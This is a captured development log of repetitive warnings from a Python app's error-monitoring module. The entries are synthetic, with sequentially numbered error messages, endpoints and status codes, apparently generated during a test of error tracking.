WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836690Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2778'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836738Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2779'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836787Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2780'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836835Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2781'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836883Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2782'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836930Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2783'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836979Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2784'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837026Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2785'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837074Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2786'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837123Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2787'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837173Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2788'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837224Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2789'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837276Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2790'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837325Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2791'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837374Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2792'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837422Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2793'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837471Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2794'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837573Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2795'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837644Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2796'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837699Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2797'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837750Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2798'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837801Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2799'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837851Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2800'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837905Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2801'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.837955Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2802'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838005Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2803'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838054Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2804'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838103Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2805'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838151Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2806'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838203Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2807'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838322Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2808'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838389Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2809'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2810'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838496Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2811'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838547Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2812'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838600Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2813'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2814'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838700Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2815'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838750Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2816'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838798Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2817'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
